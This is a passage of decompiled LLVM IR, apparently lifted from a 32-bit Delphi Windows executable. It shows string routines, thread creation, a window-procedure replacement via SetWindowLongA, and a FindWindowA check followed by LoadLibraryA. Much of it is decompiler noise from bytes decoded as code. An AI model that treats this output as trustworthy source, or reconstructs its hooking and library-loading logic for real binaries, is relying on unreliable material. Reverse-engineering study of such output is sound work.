  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1354
  %30 = add i8 %27, %29, !insn.addr !1354
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1354
  store i8 %30, i8* %31, align 1, !insn.addr !1354
  %32 = load i8, i8* %7, align 4, !insn.addr !1355
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1355
  %35 = add i8 %32, %34, !insn.addr !1355
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1355
  store i8 %35, i8* %36, align 1, !insn.addr !1355
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1356
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1357
  store i32 11, i32* %ecx.0.reg2mem, !insn.addr !1357
  br label %dec_label_pc_406350, !insn.addr !1357

dec_label_pc_406350:                              ; preds = %dec_label_pc_406350, %dec_label_pc_406337
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1358
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1358
  store i32 0, i32* %39, align 4, !insn.addr !1358
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1359
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1359
  store i32 0, i32* %41, align 4, !insn.addr !1359
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1360
  %43 = icmp eq i32 %42, 0, !insn.addr !1360
  %44 = icmp eq i1 %43, false, !insn.addr !1361
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1361
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1361
  br i1 %44, label %dec_label_pc_406350, label %dec_label_pc_406357, !insn.addr !1361

dec_label_pc_406357:                              ; preds = %dec_label_pc_406350
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1362
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1362
  store i32 0, i32* %46, align 4, !insn.addr !1362
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1363
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1363
  store i32 %37, i32* %48, align 4, !insn.addr !1363
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1364
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1364
  store i32 4220310, i32* %50, align 4, !insn.addr !1364
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1365
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1365
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1365
  store i32 %51, i32* %53, align 4, !insn.addr !1365
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1366
  %54 = call i32 @"@LStrPos"(), !insn.addr !1367
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1368
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1368
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1368
  store i32 %57, i32* %56, align 4, !insn.addr !1368
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1369
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1370
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1370
  store i32 %61, i32* %60, align 4, !insn.addr !1370
  %62 = call i32 @function_4034c8(), !insn.addr !1371
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1372
  %64 = add i32 %arg1, -1, !insn.addr !1373
  store i32 %64, i32* %eax, align 4, !insn.addr !1373
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_40657b [
    i32 0, label %dec_label_pc_4063c9
    i32 1, label %dec_label_pc_406506
    i32 2, label %dec_label_pc_406570
  ]

dec_label_pc_4063c9:                              ; preds = %dec_label_pc_406357
  %65 = call i32 @function_4034c8(), !insn.addr !1374
  %66 = icmp slt i32 %65, 5, !insn.addr !1375
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1375
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1375
  br i1 %66, label %dec_label_pc_40657b, label %dec_label_pc_4063da, !insn.addr !1375

dec_label_pc_4063da:                              ; preds = %dec_label_pc_4063c9
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1376
  %68 = call i32 @function_4060f0(), !insn.addr !1377
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1378
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1378
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1379
  %72 = call i32 @function_4060f0(), !insn.addr !1380
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1381
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1381
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1382
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1382
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1382
  store i32 %75, i32* %77, align 4, !insn.addr !1382
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1383
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1383
  store i32 ptrtoint (i32* @global_var_4065b8 to i32), i32* %79, align 4, !insn.addr !1383
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1384
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1384
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1384
  store i32 %80, i32* %82, align 4, !insn.addr !1384
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1385
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1386
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1386
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1387
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1387
  store i32 4220356, i32* %87, align 4, !insn.addr !1387
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1388
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1388
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1388
  store i32 %88, i32* %90, align 4, !insn.addr !1388
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1389
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1389
  store i32 4220372, i32* %92, align 4, !insn.addr !1389
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1390
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1390
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1390
  store i32 %93, i32* %95, align 4, !insn.addr !1390
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1391
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1391
  store i32 4220388, i32* %97, align 4, !insn.addr !1391
  %98 = call i32 @function_407410(), !insn.addr !1392
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1393
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1393
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1394
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1395
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1395
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1396
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1396
  store i32 %106, i32* %105, align 4, !insn.addr !1396
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1397
  %108 = call i32 @function_4060f0(), !insn.addr !1398
  %109 = call i32 @"@LStrPos"(), !insn.addr !1399
  %110 = add i32 %109, -1, !insn.addr !1400
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1401
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1401
  store i32 %110, i32* %112, align 4, !insn.addr !1401
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1402
  %114 = call i32 @function_4060f0(), !insn.addr !1403
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1404
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1405
  store i32 %116, i32* %112, align 4, !insn.addr !1406
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1407
  %118 = call i32 @function_4060f0(), !insn.addr !1408
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1409
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1409
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1410
  %122 = call i32 @function_4060f0(), !insn.addr !1411
  %123 = call i32 @function_4057d0(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1412
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1413
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1413
  br label %dec_label_pc_40657b, !insn.addr !1413

dec_label_pc_406506:                              ; preds = %dec_label_pc_406357
  %124 = call i32 @function_4034c8(), !insn.addr !1414
  %125 = icmp slt i32 %124, 5, !insn.addr !1415
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1415
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1415
  br i1 %125, label %dec_label_pc_40657b, label %dec_label_pc_406513, !insn.addr !1415

dec_label_pc_406513:                              ; preds = %dec_label_pc_406506
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1416
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1416
  store i32 ptrtoint ([5 x i8]* @global_var_406604 to i32), i32* %127, align 4, !insn.addr !1416
  %128 = call i32 @function_404b20(), !insn.addr !1417
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1418
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1418
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1419
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1419
  store i32 ptrtoint ([7 x i8]* @global_var_406614 to i32), i32* %132, align 4, !insn.addr !1419
  %133 = call i32 @function_404b20(), !insn.addr !1420
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1421
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1422
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1423
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1423
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1424
  %140 = call i32 @function_4060f0(), !insn.addr !1425
  %141 = call i32 @function_404c78(), !insn.addr !1426
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1427
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1427
  br label %dec_label_pc_40657b, !insn.addr !1427

dec_label_pc_406570:                              ; preds = %dec_label_pc_406357
  %142 = call i32 @function_4034c8(), !insn.addr !1428
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1429
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1429
  br label %dec_label_pc_40657b, !insn.addr !1429

dec_label_pc_40657b:                              ; preds = %dec_label_pc_406357, %dec_label_pc_406570, %dec_label_pc_406513, %dec_label_pc_406506, %dec_label_pc_4063da, %dec_label_pc_4063c9
  %143 = add i32 %esp.0.reload, -16, !insn.addr !1430
  %144 = inttoptr i32 %143 to i32*, !insn.addr !1430
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %145 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1431
  call void @__writefsdword(i32 0, i32 %145), !insn.addr !1432
  %146 = add i32 %esp.1.reload, 8, !insn.addr !1433
  %147 = inttoptr i32 %146 to i32*, !insn.addr !1433
  store i32 4220317, i32* %147, align 4, !insn.addr !1433
  %148 = call i32 @"@LStrArrayClr"(), !insn.addr !1434
  ret i32 %148, !insn.addr !1435
}

define i32 @function_406596() local_unnamed_addr {
dec_label_pc_406596:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1436
  ret i32 %0, !insn.addr !1436
}

define i32 @function_40659b() local_unnamed_addr {
dec_label_pc_40659b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1437
}

define i32 @function_40659d(i32 %arg1) local_unnamed_addr {
dec_label_pc_40659d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1438
}

define i32 @function_4065c7() local_unnamed_addr {
dec_label_pc_4065c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1439
}

define i32 @function_4065cf() local_unnamed_addr {
dec_label_pc_4065cf:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1440
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1440
  store i32 %1, i32* %2, align 4, !insn.addr !1440
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1441
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1441
  %7 = add i8 %4, %6, !insn.addr !1441
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1441
  store i8 %7, i8* %8, align 1, !insn.addr !1441
  %9 = load i8, i8* %3, align 4, !insn.addr !1442
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1442
  %12 = trunc i32 %11 to i8, !insn.addr !1442
  %13 = add i8 %9, %12, !insn.addr !1442
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1442
  store i8 %13, i8* %14, align 1, !insn.addr !1442
  %15 = load i32, i32* %eax, align 4, !insn.addr !1443
  ret i32 %15, !insn.addr !1443
}

define i32 @function_4065d6() local_unnamed_addr {
dec_label_pc_4065d6:
  %0 = call x86_fp80 @function_406614(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1444
  %1 = fptrunc x86_fp80 %0 to float, !insn.addr !1444
  %2 = bitcast float %1 to i32, !insn.addr !1444
  ret i32 %2, !insn.addr !1444
}

define i32 @function_406612() local_unnamed_addr {
dec_label_pc_406612:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1445
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1445
  store i8 %2, i8* %3, align 1, !insn.addr !1445
  ret i32 %0, !insn.addr !1445
}

define x86_fp80 @function_406614(i32 %arg1) local_unnamed_addr {
dec_label_pc_406614:
  %ebx.1.reg2mem = alloca i32, !insn.addr !1446
  %esp.1.reg2mem = alloca i32, !insn.addr !1446
  %ebx.0.reg2mem = alloca i32, !insn.addr !1446
  %esp.0.reg2mem = alloca i32, !insn.addr !1446
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call x86_fp80 @__decompiler_undefined_function_10()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  br i1 %3, label %dec_label_pc_406678, label %dec_label_pc_406617, !insn.addr !1446

dec_label_pc_406617:                              ; preds = %dec_label_pc_406614
  %5 = icmp eq i1 %4, false, !insn.addr !1447
  br i1 %5, label %dec_label_pc_40668c, label %dec_label_pc_406619, !insn.addr !1447

dec_label_pc_406619:                              ; preds = %dec_label_pc_406617
  %6 = trunc i32 %1 to i16, !insn.addr !1448
  %7 = call i8 @__asm_in(i16 %6), !insn.addr !1448
  %8 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1449
  %9 = add i32 %0, 12, !insn.addr !1450
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1450
  %11 = load i32, i32* %10, align 4, !insn.addr !1450
  %12 = icmp eq i32 %11, 74, !insn.addr !1451
  %13 = icmp eq i1 %12, false, !insn.addr !1452
  store i32 %8, i32* %esp.1.reg2mem, !insn.addr !1452
  store i32 %11, i32* %ebx.1.reg2mem, !insn.addr !1452
  br i1 %13, label %dec_label_pc_40667d, label %dec_label_pc_406629, !insn.addr !1452

dec_label_pc_406629:                              ; preds = %dec_label_pc_406619
  %14 = call i32 @"@LStrSetLength"(), !insn.addr !1453
  %15 = call i32 @function_403720(), !insn.addr !1454
  %16 = call i32 @function_4045ac(), !insn.addr !1455
  %17 = add i32 %0, 20, !insn.addr !1456
  %18 = inttoptr i32 %17 to %_SECURITY_ATTRIBUTES*, !insn.addr !1457
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1458
  store i32 0, i32* %stack_var_-56, align 4, !insn.addr !1459
  %20 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1459
  store i32 %20, i32* %esp.0.reg2mem, !insn.addr !1459
  store i32 %11, i32* %ebx.0.reg2mem, !insn.addr !1459
  br label %dec_label_pc_406678, !insn.addr !1459

dec_label_pc_406678:                              ; preds = %dec_label_pc_406629, %dec_label_pc_406614
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %21 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1460
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !1460
  store i32 %ebx.0.reload, i32* %ebx.1.reg2mem, !insn.addr !1460
  br label %dec_label_pc_40667d, !insn.addr !1460

dec_label_pc_40667d:                              ; preds = %dec_label_pc_406678, %dec_label_pc_406619
  %ebx.1.reload = load i32, i32* %ebx.1.reg2mem
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %22 = add i32 %0, 20, !insn.addr !1461
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1461
  %24 = load i32, i32* %23, align 4, !insn.addr !1461
  %25 = add i32 %esp.1.reload, -4, !insn.addr !1462
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1462
  store i32 %24, i32* %26, align 4, !insn.addr !1462
  %27 = add i32 %0, 16, !insn.addr !1463
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1463
  %29 = load i32, i32* %28, align 4, !insn.addr !1463
  %30 = add i32 %esp.1.reload, -8, !insn.addr !1464
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1464
  store i32 %29, i32* %31, align 4, !insn.addr !1464
  %32 = add i32 %esp.1.reload, -12, !insn.addr !1465
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1465
  store i32 %ebx.1.reload, i32* %33, align 4, !insn.addr !1465
  %34 = add i32 %0, 8, !insn.addr !1466
  %35 = inttoptr i32 %34 to i32*, !insn.addr !1466
  %36 = load i32, i32* %35, align 4, !insn.addr !1466
  %37 = add i32 %esp.1.reload, -16, !insn.addr !1467
  %38 = inttoptr i32 %37 to i32*, !insn.addr !1467
  store i32 %36, i32* %38, align 4, !insn.addr !1467
  ret x86_fp80 %2, !insn.addr !1467

dec_label_pc_40668c:                              ; preds = %dec_label_pc_406617
  %39 = fdiv x86_fp80 %2, %2, !insn.addr !1468
  ret x86_fp80 %39, !insn.addr !1469
}

define i32 @function_406698() local_unnamed_addr {
dec_label_pc_406698:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1470
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1470
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4220444 to i32*), i32 -4, i32 %3), !insn.addr !1471
  ret i32 %4, !insn.addr !1472
}

define i32 @function_4066cd(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_4066cd:
  %merge7.reg2mem = alloca i32, !insn.addr !1473
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1473
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1473
  store i8 %3, i8* %4, align 1, !insn.addr !1473
  %5 = add i32 %1, 114, !insn.addr !1474
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1474
  %7 = load i8, i8* %6, align 1, !insn.addr !1474
  %8 = udiv i32 %0, 256, !insn.addr !1474
  %9 = trunc i32 %8 to i8, !insn.addr !1474
  %10 = add i8 %7, %9, !insn.addr !1474
  store i8 %10, i8* %6, align 1, !insn.addr !1474
  %11 = add i8 %2, -32, !insn.addr !1475
  %12 = icmp ult i8 %2, 32, !insn.addr !1475
  %13 = icmp eq i8 %11, 0, !insn.addr !1475
  %14 = zext i8 %11 to i32, !insn.addr !1475
  %15 = and i32 %1, -256, !insn.addr !1475
  %16 = or i32 %15, %14, !insn.addr !1475
  %17 = or i1 %12, %13, !insn.addr !1476
  store i32 %16, i32* %merge7.reg2mem, !insn.addr !1476
  br i1 %17, label %dec_label_pc_4066d6, label %dec_label_pc_406727, !insn.addr !1476

dec_label_pc_4066d6:                              ; preds = %dec_label_pc_4066cd
  %18 = add i32 %16, 105, !insn.addr !1477
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1477
  %20 = load i8, i8* %19, align 1, !insn.addr !1477
  %21 = and i8 %20, %9, !insn.addr !1477
  store i8 %21, i8* %19, align 1, !insn.addr !1477
  %22 = trunc i32 %arg3 to i16, !insn.addr !1478
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1478
  %24 = load i8, i8* %23, align 1, !insn.addr !1478
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1478
  %25 = add i32 %arg5, 105, !insn.addr !1479
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1479
  %28 = load i8, i8* %27, align 1, !insn.addr !1479
  %29 = udiv i32 %arg2, 256, !insn.addr !1479
  %30 = trunc i32 %29 to i8, !insn.addr !1479
  %31 = and i8 %28, %30, !insn.addr !1479
  store i8 %31, i8* %27, align 1, !insn.addr !1479
  %32 = mul i32 %arg5, 2, !insn.addr !1480
  %33 = add i32 %arg2, 115, !insn.addr !1480
  %34 = add i32 %33, %32, !insn.addr !1480
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1480
  %36 = load i8, i8* %35, align 1, !insn.addr !1480
  %37 = trunc i32 %arg2 to i8, !insn.addr !1480
  %38 = add i8 %36, %37, !insn.addr !1480
  %39 = icmp eq i8 %38, 0, !insn.addr !1480
  store i8 %38, i8* %35, align 1, !insn.addr !1480
  store i32 %arg1, i32* %merge7.reg2mem, !insn.addr !1481
  br i1 %39, label %dec_label_pc_406727, label %dec_label_pc_4066e5, !insn.addr !1481

dec_label_pc_4066e5:                              ; preds = %dec_label_pc_4066d6
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1482
  %41 = load i32, i32* %40, align 4, !insn.addr !1482
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1482
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1483
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1483
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1483
  %45 = icmp eq i32* %43, null, !insn.addr !1484
  %46 = icmp eq i1 %45, false, !insn.addr !1485
  store i32 %44, i32* %merge7.reg2mem, !insn.addr !1485
  br i1 %46, label %dec_label_pc_406727, label %dec_label_pc_406709, !insn.addr !1485

dec_label_pc_406709:                              ; preds = %dec_label_pc_4066e5
  %47 = call i32 @function_406698(), !insn.addr !1486
  %48 = call i32 @function_4036c8(), !insn.addr !1487
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1488
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1489
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1489
  ret i32 %51, !insn.addr !1490

dec_label_pc_406727:                              ; preds = %dec_label_pc_4066cd, %dec_label_pc_4066e5, %dec_label_pc_4066d6
  %merge7.reload = load i32, i32* %merge7.reg2mem
  ret i32 %merge7.reload, !insn.addr !1491
}

define i32 @function_4067ed(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_4067ed:
  %esp.2.reg2mem = alloca i32, !insn.addr !1492
  %esp.1.lcssa.reg2mem = alloca i32, !insn.addr !1492
  %esp.13.reg2mem = alloca i32, !insn.addr !1492
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1492
  %eax.0.reg2mem = alloca i32, !insn.addr !1492
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %6 = trunc i32 %5 to i8
  %7 = mul i8 %6, 2, !insn.addr !1492
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1492
  store i8 %7, i8* %8, align 1, !insn.addr !1492
  %9 = add i32 %5, 114, !insn.addr !1493
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1493
  %11 = load i8, i8* %10, align 1, !insn.addr !1493
  %12 = udiv i32 %2, 256, !insn.addr !1493
  %13 = trunc i32 %12 to i8, !insn.addr !1493
  %14 = add i8 %11, %13, !insn.addr !1493
  store i8 %14, i8* %10, align 1, !insn.addr !1493
  %15 = add i8 %6, -32, !insn.addr !1494
  %16 = icmp ult i8 %6, 32, !insn.addr !1494
  %17 = icmp eq i8 %15, 0, !insn.addr !1494
  %18 = or i1 %16, %17, !insn.addr !1495
  br i1 %18, label %dec_label_pc_4067f6, label %dec_label_pc_406865, !insn.addr !1495

dec_label_pc_4067f6:                              ; preds = %dec_label_pc_4067ed
  %19 = and i32 %5, -256, !insn.addr !1494
  %20 = zext i8 %15 to i32, !insn.addr !1494
  %21 = or i32 %19, %20, !insn.addr !1494
  %22 = add i32 %21, 105, !insn.addr !1496
  %23 = inttoptr i32 %22 to i8*, !insn.addr !1496
  %24 = load i8, i8* %23, align 1, !insn.addr !1496
  %25 = and i8 %24, %13, !insn.addr !1496
  store i8 %25, i8* %23, align 1, !insn.addr !1496
  %26 = load i32, i32* %stack_var_28, align 4, !insn.addr !1497
  %27 = trunc i32 %arg3 to i16, !insn.addr !1498
  %28 = inttoptr i32 %arg6 to i8*, !insn.addr !1498
  %29 = load i8, i8* %28, align 1, !insn.addr !1498
  call void @__asm_outsb(i16 %27, i8 %29), !insn.addr !1498
  %30 = add i32 %arg5, 105, !insn.addr !1499
  %31 = and i32 %30, 65535
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1499
  %33 = load i8, i8* %32, align 1, !insn.addr !1499
  %34 = udiv i32 %arg2, 256, !insn.addr !1499
  %35 = trunc i32 %34 to i8, !insn.addr !1499
  %36 = and i8 %33, %35, !insn.addr !1499
  store i8 %36, i8* %32, align 1, !insn.addr !1499
  %37 = mul i32 %arg5, 2, !insn.addr !1500
  %38 = add i32 %arg2, 115, !insn.addr !1500
  %39 = add i32 %38, %37, !insn.addr !1500
  %40 = inttoptr i32 %39 to i8*, !insn.addr !1500
  %41 = load i8, i8* %40, align 1, !insn.addr !1500
  %42 = trunc i32 %arg2 to i8, !insn.addr !1500
  %43 = add i8 %41, %42, !insn.addr !1500
  %44 = icmp eq i8 %43, 0, !insn.addr !1500
  store i8 %43, i8* %40, align 1, !insn.addr !1500
  store i32 %26, i32* %eax.0.reg2mem, !insn.addr !1501
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1501
  br i1 %44, label %dec_label_pc_406847, label %dec_label_pc_406805, !insn.addr !1501

dec_label_pc_406805:                              ; preds = %dec_label_pc_4067f6
  %45 = icmp slt i8 %43, 0, !insn.addr !1500
  %46 = inttoptr i32 %arg6 to i32*, !insn.addr !1502
  %47 = load i32, i32* %46, align 4, !insn.addr !1502
  call void @__asm_outsd(i16 %27, i32 %47), !insn.addr !1502
  br i1 %45, label %dec_label_pc_40687c, label %dec_label_pc_40680a, !insn.addr !1503

dec_label_pc_40680a:                              ; preds = %dec_label_pc_406805
  %48 = trunc i32 %26 to i8, !insn.addr !1504
  %49 = add i8 %48, -32, !insn.addr !1504
  %50 = icmp ult i8 %48, 32, !insn.addr !1504
  %51 = icmp eq i8 %49, 0, !insn.addr !1504
  %52 = zext i8 %49 to i32, !insn.addr !1504
  %53 = and i32 %26, -256, !insn.addr !1504
  %54 = or i32 %53, %52, !insn.addr !1504
  %55 = or i1 %50, %51, !insn.addr !1505
  br i1 %55, label %dec_label_pc_40680e, label %dec_label_pc_40687d, !insn.addr !1505

dec_label_pc_40680e:                              ; preds = %dec_label_pc_40680a
  %56 = add i32 %arg2, 105, !insn.addr !1506
  %57 = inttoptr i32 %56 to i8*, !insn.addr !1506
  %58 = load i8, i8* %57, align 1, !insn.addr !1506
  %59 = udiv i32 %26, 256, !insn.addr !1506
  %60 = trunc i32 %59 to i8, !insn.addr !1506
